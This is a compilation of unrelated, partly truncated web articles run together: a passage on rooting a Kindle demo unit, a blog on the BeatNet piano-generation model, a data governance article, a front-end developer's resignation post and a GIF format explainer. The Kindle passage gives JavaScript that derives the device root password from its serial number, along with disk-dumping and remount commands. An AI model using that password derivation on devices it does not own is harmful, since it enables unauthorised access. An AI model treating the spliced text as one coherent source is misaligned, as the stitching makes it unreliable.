<p>Trying to login as root prompts for a password: Hmm… However, I already knew from previous Kindle stuff that you can generate the password from the serial number. I found <a href="https://www.sven.de/kindle/">this website</a> which generates a number of possible passwords for a specific device: Mine was the third on the list.</p>



<p>In case that site dies here’s the key snippet of Javascript:</p>



<pre><code>var md5 = hex_md5(serial);
document.getElementById("rootpw").innerHTML = "fiona" + md5.substring(7,11);
document.getElementById("rootpw2").innerHTML = "fiona" + md5.substring(7,10);
document.getElementById("rootpw3").innerHTML = "fiona" + md5.substr(13,3);</code></pre>



<p>Oh: I forgot to mention how I extracted the device’s serial number. Well, plugging it into USB doesn’t really “work”: you can’t mount these demo devices as disks. But, under linux, it still outputs the serial number in linux’s <strong>dmesg</strong> output (you can also get it using <strong>printenv</strong> in uboot if you press enter when it says “Hit any key to stop autoboot”):</p>



<pre><code>[128033.676587] usb 1-2: new high-speed USB device number 51 using xhci_hcd
[128033.829631] usb 1-2: New USB device found, idVendor=1949, idProduct=0004, bcdDevice= 1.00
[128033.829638] usb 1-2: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[128033.829642] usb 1-2: Product: Amazon Kindle
[128033.829645] usb 1-2: Manufacturer: Amazon
[128033.829648] usb 1-2: SerialNumber: XXXXXXXXXXXXXXXX
</code></pre>



<p>Cool! We have root and can login! Now to figure out how to make it a bit easier to do stuff on it.</p>



<p>Dumping The System</p>



<p>First step is usually to dump the disks for analysis on another computer.</p>



<p>Checking <code>/proc/mounts</code> shows multiple partitions of the main disk on <code>/dev/mmcblk0</code>.</p>



<p>Running <code>fdisk /dev/mmcblk0</code> gives the following:</p>



<pre><code>Units = cylinders of 64 * 512 = 32768 bytes

        Device Boot      Start         End      Blocks  Id System
/dev/mmcblk0p1   *        1025       12224      358400  83 Linux
/dev/mmcblk0p2           12225       14272       65536  83 Linux
/dev/mmcblk0p3           14273       15296       32768  83 Linux
/dev/mmcblk0p4           15297       59776     1423360   b Win95 FAT32</code></pre>



<ul><li>So, four partitions, three linux, and one FAT32. </li><li>The first disk starts quite far into the disk: turns out the kernel is stored in that “missing” area. </li><li>Poking about a bit more shows partition 1 is the normal system, 2 is a sort of diagnostic tool partition, 3 is for storing internal private state of the kindle (eg wifi passwords). Finally, 4 is the one you see when you plug a kindle in over USB: its where your books would reside.</li><li>Partition 4 is mounted at /mnt/us.</li></ul>



<p>I dumped the start of the disk and partitions 1-3 onto /mnt/us using dd (I like to take a complete raw image if I can so I can restore it in case something goes wrong):</p>



<pre><code>dd if=/dev/mmcblk0 of=/mnt/us/kindle.img bs=32768 count=15297</code></pre>



<p>Although this Kindle doesn’t show a disk over USB, since I have root, I can simply make it do it:</p>



<pre><code>rmmod g_file_storage
modprobe g_file_storage file=/dev/mmcblk0p4</code></pre>



<p>It popped up on my laptop so I copied everything off.</p>



<p>System Analysis</p>



<p>Finally, I mounted the partitions in kindle.img on my laptop with:</p>



<pre><code>kpartx -v kindle.img</code></pre>



<p>I could then mount the individual partitions on my laptop. I extracted all the files into a folder so I could poke around them and grep them easily. I figured out:</p>



<ul><li>It uses <code>rc.d</code> as its system init system, so there are lots of nice plain text scripts.</li><li>Init level 5 is the “normal” system running the ebook software</li><li>The ebook software is in <code>/opt/amazon</code> and is in Java (I kinda already knew this, but needed a quick refresher).</li><li>There’s a whole load of interesting plain text “diag” scripts for testing.</li><li>There’s a rather nifty <code>wifid</code> daemon for managing the wifi connection: I figured out how to talk to this from the diag scripts.</li><li>You can write to the eink screen from the command line using the <code>/usr/sbin/eips</code> command (<a href="https://wiki.mobileread.com/wiki/Eips">docs here</a>).</li><li>I couldn’t find an obvious “turn off demo mode” switch: it appears the demo mode is a customised build of the Java ebook software.</li><li>The following system services are to do with unsupported features, the ebook software, or talking back to amazon: <code>S50wan S70wand S75phd S81usbnetd S93webreaderd S94browserd S95framework S96boot_finished</code>.</li></ul>



<p>Talking To Wifid</p>



<p>You can use the built in wifid to connect to wifi and manage your wifi profiles. Oh, also, remember many Kindles only support 2.4Ghz wifi when you wonder why it isn’t working 😉</p>



<p><strong>List number of WIFI profiles:</strong></p>



<p><code>lipc-get-prop com.lab126.wifid profileCount</code></p>



<p><strong>Show contents of a WIFI profile:</strong></p>



<p><code>echo "{index=(0)}" | lipc-hash-prop com.lab126.wifid profileData</code></p>



<p><strong>Delete a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid deleteProfile WIFIESSID</code></p>



<p><strong>Create a WIFI profile:</strong></p>



<p><code>echo '{essid="WIFIESSID", smethod="wpa2", secured="yes", psk="WIFIPSK"}' | lipc-hash-prop com.lab126.wifid createProfile</code></p>



<p>smethod can be one of open,wep,wpa,wpa2 (if you choose open, set secured to “no”)</p>



<p>WIFIPSK is the WIFI PSK as generated with the <code>wpa_passphrase</code> utility (which is actually on the kindle): a normal “wifi passphrase” will not work.</p>



<p><strong>Connect a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid cmConnect WIFIESSID</code></p>



<p><strong>Show WIFI connection status:</strong></p>



<p><code>echo "{index = (0)}" | lipc-hash-prop -n com.lab126.wifid currentEssid</code></p>



<p>Making Changes To Root</p>



<p>Many of the following instructions need to change the root disk on the kindle. However, by default it is mounted in read only mode, preventing modification. To fix, run this command on the kindle:</p>



<pre><code>mntroot rw</code></pre>



<p>When done, set it back to read only mode to prevent any unwanted changes:</p>



<pre><code>mntroot ro</code></pre>



<p>Installing Dropbear SSH</p>



<p>I wanted to be able to ssh into my kindle, so I needed to install the <a href="https://matt.ucc.asn.au/dropbear/dropbear.html">dropbear</a> ssh daemon. Of course this is an ARM based device, so I either had to compile it myself or find it somewhere. Luckily …</p></div></article></main></section></div></div>

<h2 id="preface">Preface</h2>

<p>For the last four years, a small team at Popgun has been studying the application of deep learning to music analysis
and generation. This research has culminated in the release of <a href="https://splashpro.popgun.ai/">Splash Pro</a> - a free, AI-powered plugin 
for Digital Audio Workstations (DAWs). With the release of this blog, we hope to provide an accessible introduction to 
deep learning with music, by explaining some core projects we have worked on.</p>

<h2 id="introduction">Introduction</h2>

<p>In this post I want to describe the design of a model for expressive piano synthesis. The model, 
which we call ‘BeatNet’, is capable of analysing a piano performance and generating new pieces that imitate the 
original playing style. Before I get into the technical workings, here are a few samples generated by BeatNet:</p>

<p><strong>In the style of “Yiruma - River Flows In You”</strong>
</p>





<p><strong>In the style of “Chopin - Nocturne in E-flat major, Op. 9, No. 2”</strong>
</p>





<p><strong>In the style of “Errol Garner - Misty”*</strong>
</p>





<p>BeatNet is able to replicate many of the characteristics present in human piano performances, albeit with
some weaknesses and limitations that I will address. To explain how this model works, I have split the 
remainder of the blog into two sections. Part I will discuss musical representations, while Part II will explore the 
model design and showcase more of its capabilities.</p>

<p><span>
*Note: BeatNet does not model sustain pedal events. Sustain was manually added to this piece.
</span></p>

<h2 id="part-i---representations-of-music">Part I - Representations of Music</h2>

<p>In designing a model for music generation, it is critical to choose an appropriate representation. This choice
determines which data can be faithfully encoded, the modelling techniques that are available, and the efficacy of the 
overall system. For this reason, I have decided to begin with a brief explanation of some common musical 
representations. If this all feels familiar to you, feel free to skip ahead to part II.</p>

<h3 id="audio">Audio</h3>

<p>When we talk about audio in machine learning, we are typically referring to an array of time-domain samples. These
samples are a digital approximation to the physical sound pressure wave. The quality of this approximation is
determined by the sample rate and the bit-depth (see: <a href="https://en.wikipedia.org/wiki/Pulse-code_modulation">PCM</a>). In 
research, it is common to see sample rates of 16-22kHz. However, to capture the full range of human audible frequencies,
most HiFi applications (e.g. music, podcasts, etc) use rates of around 44kHz 
(see: <a href="https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem">Nyquist Theorem</a>).</p>

<p>Because of its high dimensionality, modelling raw audio is extremely challenging. For a generative model to 
reproduce audio structure on a timescale of a few seconds, it must capture the relationships between tens of 
thousands of samples. While it is becoming increasingly feasible to do this (see <a href="#citation-1">[1]</a>), there are more 
efficient ways to encode piano performances.</p>

<p>Note: For an example of music modelling directly in the audio domain, 
see <a href="https://openai.com/blog/jukebox/">OpenAI’s Jukebox</a> <a href="#citation-2">[2]</a>.</p>

<h3 id="midi">MIDI</h3>

<p>MIDI is a technical standard allowing electronic instruments and computers to communicate. It comprises
a sequence of ‘messages’, each describing a particular musical event or instruction. Instructions relating to the 
note timings, pitch and loudness (i.e. velocity) can be transmitted and stored. For example, a piano performance 
encoded as MIDI is a record of which notes were pressed, how forcefully and at what time.</p>

<p>To convert a MIDI file back into listenable audio, a piece of software replays these instructions and
synthesizes the relevant notes. MIDI does not encode acoustic information, such as the instrument sound or the recording
environment. For this reason it is drastically more efficient than audio, and it is a good starting point for our 
exploration.</p>

<p>When working with MIDI we use the terrific <a href="https://github.com/craffel/pretty-midi">PrettyMIDI</a> library by Colin Raffel. This abstracts away many
complexities of the raw format. See Colin Raffel’s <a href="https://colinraffel.com/publications/thesis.pdf">thesis</a> for
a more in-depth explanation of the MIDI file format.</p>

<p><strong>Figure 1 - Für Elise in PrettyMIDI Format</strong></p>
<div><div><pre><code>Note(start=0.000000, end=0.305000, pitch=76, velocity=67)
Note(start=0.300000, end=0.605000, pitch=75, velocity=63)
Note(start=0.600000, end=0.905000, pitch=76, velocity=74)
Note(start=0.900000, end=1.205000, pitch=75, velocity=71)
...
</code></pre></div></div>

<p>Notice how succinctly we can represent Für Elise this way, and consider that the equivalent audio section 
contains approximately 50k samples (for a 44kHz recording).</p>

<h3 id="piano-roll">Piano Roll</h3>

<p>This will look familiar to anyone who has used a Digital Audio Workstation (DAW) such as GarageBand or Ableton.
The vertical axis denotes pitch, and the horizontal axis denotes time. The velocity of each note is encoded
by its magnitude. As well as providing an intuitive way to visualize MIDI, piano roll has some interesting 
properties for machine learning.</p>

<p>For example, consider the effect of raising the song’s pitch by one semitone, or delaying its onset by a few seconds. 
These transpositions preserve the spatial structure of the piano roll. When designing a model we can exploit this 
property by applying 2D Convolutional Neural Networks (CNN). Early experiments at Popgun tried exactly
this, as did <a href="https://youtu.be/nA3YOFUCn4U?t=597">this project</a> using PixelCNN. However, there are some serious drawbacks to this approach.</p>

<p><strong>Figure 2 - Für Elise in Piano Roll Format</strong></p>
<p><img src="https://popgun-labs.github.io/ml-blog/assets/images/piano_roll_fur_elise_crop.png" alt="Für Elise - Piano Roll"></p>

<p>A typical song encoded as piano roll is incredibly sparse: nearly all entries are zero. 
Naively applying a CNN wastes a large amount of computation on entirely empty regions. It is also difficult
to choose a suitable resolution for the time axis. If the original data is quantised, such that each note aligns
perfectly with a uniform musical grid, we can choose the resolution based on the quantisation strength. However,
this breaks down for expressive piano performances, where natural variations in timing are critical to the musicality.</p>

<p>Note: Many works have tried to model piano roll, using a broad range of neural net architectures. For those interested 
to learn more, <a href="https://arxiv.org/abs/1206.6392">this paper</a> is a good starting point <a href="#citation-16">[16]</a>.</p>

<h3 id="time-shift-format">Time-Shift Format</h3>

<p>In 2017 <a href="https://magenta.tensorflow.org/blog/">Google Magenta</a> released a model called Performance RNN <a href="#citation-3">[3]</a>, which demonstrated the ability 
to model expressive piano performances with high fidelity. The key innovation was a new format that is highly 
suited to this task. For reasons that will become apparent, we refer to this “performance representation” simply as 
“time-shift”. Like MIDI, time-shift encodes music with a sequence of discrete musical events. What sets it apart is 
the unique way it encodes the progression of time. Instead of representing time along a specific axis (piano roll), 
or as a property of each individual note (MIDI), in time-shift there is a specific event that indicates the 
advancement of the piece.</p>

<p><strong>Figure 3 - Für Elise in Time-Shift Format</strong></p>
<div><div><pre><code>272 - Set Velocity = 64
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
271 - Set Velocity = 60
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
203 - Turn Off MIDI Note 75 (D#5)
274 - Set Velocity = 72
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
273 - Set Velocity = 68
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
...
</code></pre></div></div>

<p>This one-dimensional sequence of tokens is similar to the encodings used in language models.
This means that modern advances in NLP (e.g. ByteNet <a href="#citation-4">[4]</a>, Transformers <a href="#citation-5">[5]</a>) can be 
readily applied to the time-shift format.</p>

<p><strong>Figure 4 - An Explanation of the Time-Shift Events</strong></p>
<div><div><pre><code>0 - 127: Note on events    
128 - 255: Note off events    
256 - 287: 32 velocity change events   
288 - 387: 100 quantized time-shift values (10ms -&gt; 1000ms)
</code></pre></div></div>

<p>Note: We have not accounted for sustain pedal events, however it might be interesting to incorporate them
in future work.</p>

<h2 id="part-ii---beatnet-a-convolutional-model-for-piano-music">Part II - BeatNet: A Convolutional Model for Piano Music</h2>

<p>In 2016, researchers at Google’s DeepMind lab released the now-famous WaveNet paper <a href="#citation-1">[1]</a>. The core 
insight was that 1D convolutions could produce efficient sequence models, by eliminating the need for expensive 
recurrent computations during training. The efficacy was proven with a 
<a href="https://deepmind.com/blog/article/wavenet-generative-model-raw-audio">demo</a> of raw audio generation. The 
publication of ByteNet <a href="#citation-4">[4]</a> shortly afterwards, extended this idea to the domain of natural language 
processing.</p>

<p>Inspired by this work, Popgun developed its own ByteNet model for symbolic piano music. We refer to this work as
“BeatNet”. The choice to use ByteNet over traditionally dominant RNNs was motivated by a few factors:</p>
<ol>
  <li>The ability to capture long-term dependencies over hundreds or thousands of tokens</li>
  <li>Fast training</li>
  <li>Hype. WaveNet and ByteNet were the first papers to threaten the dominance of RNNs, before Transformer based
architectures <a href="#citation-5">[5]</a> exploded in popularity.</li>
</ol>

<h3 id="data-collection-and-processing">Data Collection and Processing</h3>

<p>We curated a MIDI dataset by drawing from a number of online sources. One key source was the
<a href="http://www.piano-e-competition.com/">Yamaha e-Piano Competition Dataset</a>, consisting of jazz 
and classical music performances. Another source was the <a href="https://colinraffel.com/projects/lmd/">Lakh MIDI Dataset</a>, 
which contains a broader range of genres, including many contemporary pieces.</p>

<p>To create a model which generates highly expressive performances, we processed the data to filter out ‘low quality’ 
items. Anyone who has worked with MIDI datasets will appreciate that many songs sound ‘bad’.
This raises some difficult problems: What is musical quality? How can we account for subjective preferences? 
Are some songs so weird we can confidently deem them ‘not musical’? Suffice to say, these problems are beyond
the scope of this post.</p>

<p>Ultimately, our working solution can be summarised as this: An engineer listened to some data items, in each case 
proclaiming “Yep, this sounds musical” or “Nope, I don’t like it”. In the process, they developed automated heuristics
to filter unwanted items, biasing the dataset towards songs that are subjectively ‘musical’. In the future it would be 
interesting to crowd-source these assessments, or to devise heuristics based on music theory instead.</p>

<p>Data Governance seeks to bring order to the chaos that emerges as organisations turn to data to make decisions. To many, the term “data” is synonymous with “fact”, forgetting the fact that data requires context to be properly interpreted. Context varies by department, business unit across teams and even within teams, leading to misinterpretation of data and increasing the risk that data is misrepresented. Data Governance helps to define rules, processes and policies for how data is collected, managed to ensure that it can be consistently interpreted and applied to advanced analytics, machine learning and automation. </p>
<p>Analytics platforms like PowerBI, Tableau and Looker put data in the hands of employees and promise better decisions based on real data. But what happens when a colleagues number is different from yours? Or when people don’t know which version of a dashboard to view? Or when you discover the “Sales metric” you have been making decisions on doesn’t actually include all the things you thought it does?</p>
<p>Machine Learning has the capability to transform all aspects of business, from recommending products to your customers, optimising call routing in your call centre through to segmenting marketing messages. As organisations become more reliant on these technologies, they are more likely to incorporate them deeper into their processes leaving them vulnerable to prickly edge cases. Machine learning fails are already well-publicised, from<a href="https://www.reuters.com/article/us-amazon-com-jobs-automation-insight-idUSKCN1MK08G" rel="nofollow"> sexist recruitment AI at Amazon</a>, or <a href="https://twitter.com/geraldmellor/status/712880710328139776?lang=en" rel="nofollow">Microsoft’s AI Twitter Bot “Tay” who lasted less than 24 hours before going full racist.</a></p>
<p>Automation, especially when combined with Machine Learning makes organisations more efficient and more scalable. Marketing Automation provides marketers with super-powers to deliver the right message to the right customer at the right time. However, when automation fails (often due to errors in data), the problems are amplified – as one mistake can set off a chain of events that can destroy organisations.</p>
<h2 id="Introduction"><span>Introduction</span></h2>
<p>To help illustrate the importance of Data Governance, we will use a fictional company, which has run into an equally fictional set of challenges. Forrest Corp, is an online book retailer with approximately 100 staff, based in Melbourne, Australia. As with many organisations of this size, Forest Corp has functional teams responsible for Marketing, Finance, Technology, Customer Service and Operations. Forrest Corp has been wildly successful, with sales exploding throughout COVID-19 lockdowns.</p>
<p><strong>The problem</strong></p>
<p>The executive team is very displeased that gross margins and profitability have deteriorated sharply, and that their personal (managed) Instagram feeds are blowing up with negative messages. They want answers! In speaking with leaders from different teams, they receive mixed messages:</p>
<ul><li>Marketing is excited to show a 10% increase in sales due to a Social Media Influencer campaign and finds it difficult to believe things are as bad as they are made out to be</li><li>Finance says sales are flat, with rising inventories, shipping costs and customer retention costs hurting margins and profitability</li><li>Customer service is inundated with complaints, but they feel they have it under control using their existing policies and procedures</li><li>Operations confirm the increase in sales, but their team is overworked in dealing with the influx of sales and a large number of returns.</li></ul>
<p>An analysis by an external analytics consultancy begins to unravel the story:</p>
<ul><li>The Marketing team recently established a new Social Media Influencer program, enabling influencers to sign up to earn referral commissions on books they recommend. </li><li>A very popular Social Media Influencer has recommended a particular book to their large follower base</li><li>The rapid increase in sales of the book have impacted the company’s recommendation model, leading to it being recommended to a much wider audience of customers</li><li>It turns out that the Social Media Influencer has misrepresented the book leading to a high rate of return from dissatisfied customers</li><li>In order to placate angry customers, customer Service follows its procedure of sending gifts to aggrieved customers, as recommended by their recommendation engine.</li><li>The gifts only inflame the situation, infuriated customers are often sent the same book as they initially returned.</li></ul>
<p>How could this all happen?</p>
<h2 id="Data-Governance">A failure of <span>Data Governance</span></h2>
<p>The <a href="https://datagovernance.com/">Data Governance Institute</a> defines data governance as “a system of decision rights and accountabilities for information-related processes, executed according to agreed-upon models which describe who can take what actions with what information, and when, under what circumstances, using what methods.”</p>
<p>Data governance is often formally practised in large organizations, but many of the concepts are applicable to all organisations seeking to utilise data in decision making.</p>
<p>In Forest Corp’s case, a series of failures in the way it collects, manages and utilizes data led to the cascading problems illustrated above.</p>
<h2 id="Data-Quality">Data Quality</h2>

<p>Data quality is the foundation for all analytics and machine learning. As organisations seek to make more decisions on the basis of data, there is a real risk that decisions can be made incorrectly if the data underpinning them is incorrect, incomplete or inconsistent.</p>
<p>A key failure for Forest Corp’s marketing team was in its lack of screening of Influencer’s past histories. Social Media Influencers could sign up for their affiliate program easily, with critical pieces of information collected without any verification.</p>
<p>In the Forest Corp example, when the Marketing team’s analytics began showing the success of one affiliate code they immediately looked up the influencer behind it. Unfortunately, the URLs behind the profile were unusable. No data was supplied for their Twitter and Facebook handles, and their supplied Instagram handle didn’t actually exist. While contact information was provided, emails and phone calls went unanswered. So the Marketing Team was faced with a challenging scenario – their Social Media Influencer program is clearly generating sales but they are blind as to the content triggering it or the person behind it.</p>
<p>If data is captured incorrectly, it is often difficult or impossible to correct it. Worst of all though is that it’s only when an organisation <em>really</em> needs high-quality data that they realise it was never collected properly. In the Forrest Corp example, they were blind to a massive spike in sales attributable to a single affiliate without any way to tie it back to.</p>
<h3 id="Data-Quality-Recommendations">Data Quality Governance Recommendations</h3>
<h4 id="Incentivise-data-quality-at-the-point-of-collection">Incentivise data quality at the point of collection</h4>
<p>Digging deeper into the sign-up process for affiliates, it was discovered that the affiliate systems were built quickly following a mandate from the Executive Team to get the system up and running prior to a major holiday. Additionally, the Marketing Manager’s key KPI’s for the quarter were the number of onboarded affiliates, as well as the sales volume generated by affiliates. The problems with the affiliate signup process was a product of these incentives.</p>
<p>The time pressure to build the onboarding system meant that the initial design could not be implemented in its entirety. As Product Owner, the Marketing Manager had to prioritize which features would make the initial version, and which would be delayed to a future version. Automated verification of affiliates was seen as a large piece of work and thought to add friction to the signup process potentially hurting the Marketing Managers KPIs. It was therefore easy for the Marketing Manager to de-prioritise this feature of the onboarding system.</p>
<h5 id="Guiding-principles-for-incentivizing-data-quality">Guiding principles for incentivizing data quality</h5>
<ul><li>Key Performance Indicators that create disincentives for data quality should be avoided.</li><li>Analyse and understand the unintended consequences of performance metrics on data quality</li><li>Incorporate data quality metrics into KPI’s for Product Owners whos products involve data capture</li></ul>
<h4 id="Projects-that-involve-data-collection-require-oversight-and-guidance,-and-periodic-review">Projects that involve data collection require oversight and guidance, and periodic review</h4>
<p>Without a process of oversight in how data was captured, the Marketing Manager was free to make decisions that ultimately caused the misleading Influencer to speak fraudulently on behalf of their organisation. However, the Marketing Manager is rightly focussed on Marketing, not issues of Data Governance. An organisation can’t and shouldn’t expect all its managers to be Data Governance experts.</p>
<h5 id="Guiding-principles-for-data-quality-oversight">Guiding principles for data quality oversight</h5>
<ul><li>A Data Governance Council should provide advice on issues relating to how projects are implemented and the potential costs and risks of different implementations.</li><li>Data quality metrics should be established with any project that involves data capture</li><li>A Data Governance Council should periodically review or audit key systems to see how they are actually being used and assess the quality of the data they capture.</li></ul>
<h4 id="Understand-the-pressures-on-your-users-when-entering-data">Understand the pressures on your users when entering data</h4>
<p>Equally, in designing the affiliate sign-up form, the Marketing Team failed to understand the pressures on Social Media Influencers. One of these pressures is the need to sign up to a <em>lot</em> of affiliate programs, and the fact that time spent signing up to affiliate programs is time not spent building their brand and following. The Forrest Corp Affiliate Signup process, while failing to verify key information, also asked for a lot of information much of which seemed fairly unimportant to them getting paid. Therefore a lot of fields were left blank, even critical ones.</p>
<h5 id="Guiding-principles-for-designing-data-capture-systems">Guiding principles for designing data capture systems</h5>
<p>Data entry is often the least enjoyable aspect of a process., but is of critical importance. Systems that collect data need to be user friendly and easy to use. Here are a few principles:</p>
<ul><li>Make use of “pick lists” or “autocomplete” to make it easy to link data</li><li>Make it easy to identify existing entities to reduce the risk of creating duplicate entries</li><li>Avoid requiring too many fields, or …</li></ul></div></div></div></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I started coding when I was 14, around 2007 or so. The very first thing I wrote was HTML, then CSS. I liked
making stupid little web pages containing youtube embeds and guest books (anyone remembers those?) full of
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/marquee">marquees</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blink">blinks</a>
and gifs. Lots of gifs. The pages were very simple, but joyful to make and also to use. At the time I had no idea that
you could make any money with making web pages, I simply thought it was a silly hobby people could have.</p>
<p>Fast-forward 3 years I got my first few gigs as a web developer. By then I was pretty good at HTML and CSS already,
had dabbled enough with PHP to know my way around of most sticky problems I would find myself in and while I didn't
really know much of vanilla JavaScript, it was okay, because everyone used almost exclusively <a href="https://jquery.com/">jQuery</a> anyway. Yet still,
the websites were rather simple and joyful to make.</p>
<p>It was easy to get started, too - you just created the files and refreshed the page. HTML? PHP? JavaScript? Just create the
file and save it, then refresh the browser. Rinse and repeat until you are happy with the result. But then, almost
out of nowhere, something changed. At first, it came slowly and before it could even speed up, it was already here.
<strong>The complicated web was here</strong>.</p>
<p>Nowadays I make a living mainly with JavaScript and TypeScript using React.js as a front-end framework. That's right,
front-ends are so complex they now need frameworks to be able to manage their seemingly infinite component hierarchies.
JavaScript no longer is liked by the community, so the community created a poor man's version of a typed language which
duct-tapes around an <a href="https://whydoesitsuck.com/why-does-javascript-suck/">already poorly made language</a>. </p>
<p>Starting a new project? Make sure to write your project idea down because by the time you are finished setting up the vast
boilerplate you have probably forgotten it. Vast boilerplate? Oh yeah, you better set-up your project with <a href="https://www.typescriptlang.org/">TypeScript</a>,
<a href="https://eslint.org/">ESlint</a>, <a href="https://webpack.js.org/">Webpack</a> and <a href="https://babeljs.io/">Babel</a>, because
if you don't then obviously you haven't learned anything since 2005 and suck. Don't have <a href="https://www.npmjs.com/">NPM</a>? Better install that, too,
because nobody installs libraries without a package manager anymore. Oh and while you're at it, install also <a href="https://yarnpkg.com/">Yarn</a>,
because why not make use of two package managers at the same time. <em>Phew</em>, you did all that? Damn, that's commitment!
You can finally write what is essentially just HTML and JavaScript!</p>
<p>Now, don't forget we also want to style our project, but if you thought you could get away with writing good ol' CSS,
you were wrong. We no longer write CSS, because it's lame. We now write <a href="https://sass-lang.com/">SCSS</a> instead,
so that we could write dynamic stylesheets that convert to CSS, because <a href="https://hospodarets.com/you-might-not-need-a-css-preprocessor">of course 99% of the web needs that</a>. </p>
<p>But enough of the hating. If I wanted I could hate on anything most likely, and the web has come a long way since 2007,
in lots of good ways, and I don't want to discredit that. I suppose with the increase of complexity in what we want to
achieve on the web the stack to achieve it with has had to also increase in complexity. For me, personally, it's
too much. I want to have a personal life and not have to spend my nights reading up on some new flavour of *.js in
fear that if I don't I would soon be made irrelevant. I don't want to learn nor use a million different tools. I don't want
to know a bit about everything and a lot about nothing. </p>
<p>Thus, I don't want to do front-end development anymore. The joy is gone. I've given in my resignation at my current place of
employment and will be seeking an exclusively back-end role for my next adventure, starting April. The language doesn't
matter much to me, I know enough of them to know that they are all very similar and thus easy enough to learn. If you know of a
good opportunity, <a href="mailto:asko@askonomm.com">let me know</a>.</p></div></div>]]>

February 8, 2021 | http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp | <a href="https://web.archive.org/web/*/http://matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p>
	We sill start off by walking though the different parts of a GIF file.
	(The information on this page is primarily drawn from the
	<a href="http://www.w3.org/Graphics/GIF/spec-gif89a.txt">W3C GIF89a specification</a>.)
	A GIF file is made up of a bunch of different "blocks" of data. The following diagram
	shows all of the different types of blocks and where they belong in the file. The file starts
	at the left and works it's way right. At each branch you may go one way or the other. The
	large "middle" section can be repeated as many times as needed. (Technically, it may
	also be omitted completely but i can't imagine what good a GIF file with no image data
	would be.)
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/gif_file_stream.gif" alt="GIF file stream diagram" width="700" height="220"></p>
	<p>
	I'll show you what these blocks looks like by walking through a sample
	GIF file. You can see the sample file and its corresponding bytes below.
	</p>
	

	<p>
	Note that not all blocks are represented in this sample file. I will provide samples of missing
	blocks where appropriate.
	The different types of blocks include:
		<a href="#header_block">header</a>,
		<a href="#logical_screen_descriptor_block">logical screen descriptor</a>,
		<a href="#global_color_table_block">global color table</a>,
		<a href="#graphics_control_extension_block">graphics control extension</a>,
		<a href="#image_descriptor_block">image descriptor</a>,
		<a href="#local_color_table_block">local color table</a>,
		<a href="#image_data_block">image data</a>,
		<a href="#plain_text_extension_block">plain text extension</a>,
		<a href="#application_extension_block">application extension</a>,
		<a href="#comment_extension_block">comment extension</a>,
		and <a href="#trailer_block">trailer</a>.
	Let's get started with the first block!
	</p>

	<h2><a name="header_block">Header Block</a></h2>
	<p>From Sample File: </p>
	<p>
	All GIF files must start with a header block. The header takes up the first
	six bytes of the file. These bytes should all correspond to
	<a href="http://www.ascii.cl/">ASCII character codes</a>. We actually have two pieces
	of information here. The first three bytes are called the <strong>signature</strong>.
	These should always be "GIF" (ie 47="G", 49="I", 46="F"). The next three specify the
	<strong>version</strong> of the specification that was used to encode the image. We'll only be working
	with "89a" (ie 38="8", 39="9", 61="a"). The only other recognized version string
	is "87a" but i doubt most people will run into those anymore.
	</p>
	<p><img src="http://matthewflickinger.com/lab/whatsinagif/images/header_block.gif" alt="GIF header block layout"></p>

	<h2><a name="logical_screen_descriptor_block">Logical Screen Descriptor</a></h2>
	<p>From Sample File: <span> 0A </span><span> 00 </span><span> 0A </span><span> 00 </span><span> 91 </span><span> 00 </span><span> 00 </span></p>
	<p>
	The logical screen descriptor always immediately follows the header. This block
	tells the decoder how much room this image will take up. It is exactly
	seven bytes long. It starts with the <strong>canvas width</strong>. This value
	can be found in the first two bytes. It's saved in a format called the spec
	simply calls <em>unsigned</em>. Basically we're looking at a 16-bit, nonnegative
	integer (0-65,535). As with all the other multi-byte values in the GIF format, the least
	significant byte is stored first (little-endian format). This means where we would read
	<span> 0A </span><span> 00 </span>
	from the byte stream, we would normally write it as <span>000A</span> which is
	the same as 10. Thus the width of our sample image is 10 pixels. As a further example
	255 would be stored as <span> FF </span><span> 00 </span> but 256 would be <span> 00 </span><span> 01 </span>.
	As you might expect, the <strong>canvas height</strong> follows. Again, in this sample we
	can see this value is <span> 0A </span><span> 00 </span> which is 10.
	</p>
	<p>
	Next we have a <em>packed byte</em>. That means that this byte actually has multiple values
	stored in its bits. In this case, the byte <span> 91 </span> can be represented
	as the binary number <span>10010001</span>. (The built in Windows calculator
	is actually very useful when converting numbers into hexadecimal and binary formats. Be sure
	it's in "scientific" or "programmer" mode, depending on the version of
	windows you have.) The first (most-significant) bit is the <strong>global color
	table flag</strong>. If it's 0, then there is none. If it's 1, then a global color table will
	follow. In our sample image, we can see that we will have a global color table (as will usually
	be the case).  The next three bits represent the <strong>color resolution</strong>. The spec
	says this value " is the number of bits per primary color available to the original image,
	minus 1" and "...represents the size of the entire palette from which the colors in the
	graphic were selected." Because i don't much about what this one does, I'll point you to
	a more knowledgeable article on <a href="http://www.devx.com/projectcool/Article/19997/0/page/7">bit and color depth</a>.
	For now 1 seems to work. Note that <span>001</span> represents 2 bits/pixel;
	<span>111</span> would represent 8 bits/pixel.
	The next single bit is the <strong>sort flag</strong>. If the values is 1, then the
	colors in the global color table are sorted in order of "decreasing importance," which
	typically means "decreasing frequency" in the image. This can help the image decoder but
	is not required. Our value has been left at 0. The last three bits are the <strong>
	size of global color table</strong>. Well, that's a lie; it's not the actual size of the
	table. If this value is N, then the actual table size is 2^(N+1). From our sample
	file, we get the three bits <span>001</span> which is the binary version of 1.
	Our actual table size would be 2^(1+1) = 2^2 = 4. (We've mentioned the global color table
	several times with this byte, we will be talking about what it is in the next section.)
	</p>
	<p>
